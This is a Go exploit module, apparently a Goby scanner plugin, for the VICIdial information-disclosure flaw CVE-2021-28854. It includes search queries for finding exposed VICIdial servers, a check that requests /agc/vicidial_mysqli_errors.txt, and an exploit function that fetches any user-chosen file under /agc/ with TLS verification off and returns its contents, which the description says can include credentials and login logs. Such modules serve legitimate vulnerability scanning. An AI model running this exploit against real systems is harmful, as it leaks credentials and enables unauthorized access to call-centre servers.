package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "VICIdial Information leakage (CVE-2021-28854)",
    "Description": "<p>VICIDIAL is a software suite that is designed to interact with the Asterisk Open-Source PBX Phone system to act as a complete inbound/outbound contact center suite with inbound email support as well.</p><p>VICIdial's Web Client contains many sensitive files that can be accessed from the client. These files include mysqli logs, authentication logs, debugging information, successful and unsuccessful login attempts, and the corresponding IP, user agent, credentials, and so on. Attackers can use this information to further access the VICIdial system.</p>",
    "Impact": "VICIdial Information leakage (CVE-2021-28854)",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.vicidial.org/vicidial.php\">http://www.vicidial.org/vicidial.php</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "VICIdial",
    "VulType": [
        "Information Disclosure"
    ],
    "Tags": [
        "Information Disclosure"
    ],
    "Translation": {
        "CN": {
            "Name": "VICIdial 系统 vicidial_mysqli_errors.txt 信息泄漏漏洞 (CVE-2021-28854)",
            "Description": "<p>VICIDIAL 是一个软件套件，旨在与 Asterisk 开源 PBX 电话系统交互，作为一个完整的呼入/呼出联络中心套件，同时支持呼入电子邮件。</p><p>VICIdial 的 Web Client 包含许多可以从客户端访问的敏感文件。这些文件包含 mysqli 日志、身份验证日志、调试信息、成功和不成功的登录尝试以及相应的 IP、用户代理、凭据等等。攻击者可以利用此信息进一步访问 VICIdial 系统。</p>",
            "Impact": "<p>VICIdial 的 Web Client 包含许多可以从客户端访问的敏感文件。这些文件包含 mysqli 日志、身份验证日志、调试信息、成功和不成功的登录尝试以及相应的 IP、用户代理、凭据等等。攻击者可以利用此信息进一步访问 VICIdial 系统。</p>",
            "Recommendation": "<p>⼚商已发布了漏洞修复程序，请及时关注更新：厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"http://www.vicidial.org/vicidial.php\">http://www.vicidial.org/vicidial.php</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "VICIdial",
            "VulType": [
                "信息泄露"
            ],
            "Tags": [
                "信息泄露"
            ]
        },
        "EN": {
            "Name": "VICIdial Information leakage (CVE-2021-28854)",
            "Description": "<p>VICIDIAL is a software suite that is designed to interact with the Asterisk Open-Source PBX Phone system to act as a complete inbound/outbound contact center suite with inbound email support as well.</p><p>VICIdial's Web Client contains many sensitive files that can be accessed from the client. These files include mysqli logs, authentication logs, debugging information, successful and unsuccessful login attempts, and the corresponding IP, user agent, credentials, and so on. Attackers can use this information to further access the VICIdial system.</p>",
            "Impact": "VICIdial Information leakage (CVE-2021-28854)",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"http://www.vicidial.org/vicidial.php\">http://www.vicidial.org/vicidial.php</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "VICIdial",
            "VulType": [
                "Information Disclosure"
            ],
            "Tags": [
                "Information Disclosure"
            ]
        }
    },
    "FofaQuery": "body=\"vicidial\" && (body=\"agc/vicidial.php\" || body=\"/vicidial/admin.php\" || body=\"vicidial_logo.png\" || title=\"VICIDial\")",
    "GobyQuery": "body=\"vicidial\" && (body=\"agc/vicidial.php\" || body=\"/vicidial/admin.php\" || body=\"vicidial_logo.png\" || title=\"VICIDial\")",
    "Author": "1291904552@qq.com",
    "Homepage": "http://www.vicidial.org/vicidial.php",
    "DisclosureDate": "2021-09-28",
    "References": [
        "https://github.com/projectdiscovery/nuclei-templates/blob/master/cves/2021/CVE-2021-28854.yaml"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "6.0",
    "CVEIDs": [
        "CVE-2021-28854"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "input",
            "value": "vicidial_mysqli_errors.txt",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "VICIdial"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "6839"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri1 := "/agc/vicidial_mysqli_errors.txt"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 && strings.Contains(resp1.RawBody, "vdc_db_query") {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			uri := "/agc/" + cmd
			cfg := httpclient.NewGetRequestConfig(uri)
			cfg.VerifyTls = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					expResult.Output = resp.RawBody
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
